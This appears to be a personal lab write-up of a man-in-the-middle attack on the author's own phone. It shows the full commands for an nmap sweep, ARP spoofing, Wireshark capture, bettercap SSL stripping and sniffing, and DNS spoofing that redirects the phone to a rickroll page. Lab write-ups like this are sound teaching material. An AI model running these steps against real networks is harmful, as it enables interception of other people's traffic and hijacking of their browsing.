◈ WHAT IS A MITM ATTACK?

A Man-in-the-Middle (MITM) attack happens when an attacker secretly positions themselves between two communicating devices — like sitting between you and the internet, reading everything you send and receive.

The victim has no idea. Traffic flows normally. But the attacker sees everything.

NORMAL: 📱 Phone ──────────────────► 🌐 Internet ATTACK: 📱 Phone ──► 💻 ATTACKER ──► 🌐 Internet ↑ reads all data
◈ NETWORK SETUP

The lab used three devices forming a controlled network:

🌐 INTERNET │ 📱 Phone 2 (USB Tethered) │ gives internet to laptop 💻 LAPTOP ──── WiFi Hotspot (wlp4s0) │ 📱 Phone 1 ← TARGET [10.42.0.46]

The laptop acts as the gateway for Phone 1, giving it internet — and making it the perfect MITM position.

◈ PHASE-BY-PHASE BREAKDOWN
[ PHASE 1 ] — RECON & SETUP

Identified network interfaces and confirmed Python was available. No extra packages needed for the ARP spoofer.

ip link show ip addr show
[ PHASE 2 ] — TARGET DISCOVERY

Scanned the local network to find connected devices. Phone 1 found at 10.42.0.46.

ip neigh nmap -sn 10.42.0.0/24
[ PHASE 3 ] — ARP SPOOFING

ARP (Address Resolution Protocol) maps IP addresses to MAC addresses. By sending fake ARP replies, the attacker tricks the target into sending all traffic through the attacker's machine.

sudo python3 arpspoof.py 10.42.0.46 -f

Result: IPv4 forwarding enabled. Laptop is now between Phone 1 and the internet.

[ PHASE 4 ] — TRAFFIC CAPTURE (WIRESHARK)

Wireshark captures all packets passing through the interface. With a simple filter, every DNS request (= every website visit) from Phone 1 became visible.

sudo apt install wireshark -y # Filter used inside Wireshark: ip.addr == 10.42.0.46 && dns

Result: 34,000+ packets captured. Every website Phone 1 visited — visible in real time.

[ PHASE 5 ] — BETTERCAP (PRO MITM)

Bettercap is a full-featured MITM framework. It combines ARP spoofing, HTTP proxying, SSL stripping, and sniffing in one tool.

sudo bettercap -iface wlp4s0 # Inside bettercap: net.probe on set arp.spoof.targets 10.42.0.46 arp.spoof on set https.proxy.sslstrip true http.proxy on net.sniff on

Captured metadata: [net.sniff.https] Android → edge-mqtt.facebook.com

Even HTTPS leaks which servers the device is talking to.

[ PHASE 6 ] — DNS SPOOFING + RICKROLL 😂

DNS spoofing poisons the DNS responses so that domain names resolve to a fake IP — the attacker's machine. Apache was set up to serve a rickroll page.

sudo apt install apache2 -y sudo systemctl start apache2 # Wrote rickroll HTML to /var/www/html/index.html # In bettercap: set dns.spoof.domains neverssl.com,speedtest.net set dns.spoof.address 10.42.0.1 dns.spoof on

Phone 1 opens speedtest.net → Gets Rickrolled. Attack confirmed. 🎵

◈ HOW ARP SPOOFING WORKS (SIMPLE)

Every device on a network uses ARP to ask: "Who has IP X? Tell me your MAC address."

ARP has NO authentication. Anyone can reply. The attacker sends fake replies to both the target and the gateway:

Attacker → Target: "The gateway's MAC? That's ME." Attacker → Gateway: "The target's MAC? That's ME." Both now send traffic through the attacker. ✓

◈ HTTP vs HTTPS

HTTP All content visible — URLs, passwords, cookies, everything.
HTTPS Content encrypted — but the domain name is still exposed via DNS and SNI.
SSL STRIP Downgrades HTTPS to HTTP silently. User doesn't notice.

Bottom line: no encryption = no privacy. Even HTTPS isn't perfect against a MITM on your LAN.
